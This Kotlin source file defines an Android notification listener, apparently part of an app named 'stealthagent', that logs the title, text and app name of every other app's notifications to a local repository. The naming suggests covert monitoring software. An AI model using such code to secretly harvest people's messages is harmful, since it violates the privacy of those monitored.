package com.stealthagent.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.stealthagent.data.AgentRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject

@AndroidEntryPoint
class AgentNotificationListener : NotificationListenerService() {

    @Inject lateinit var repository: AgentRepository
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (sbn.packageName == packageName) return
        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString()
        val text = extras.getCharSequence("android.text")?.toString()
        val appName = runCatching {
            packageManager.getApplicationLabel(packageManager.getApplicationInfo(sbn.packageName, 0)).toString()
        }.getOrNull()

        scope.launch {
            runCatching {
                repository.recordEvent("NOTIFICATION", Json.encodeToString(mapOf(
                    "packageName" to sbn.packageName, "appName" to (appName ?: ""),
                    "title" to (title ?: ""), "text" to (text ?: ""), "postedAt" to sbn.postTime.toString()
                )))
            }
        }
    }
}
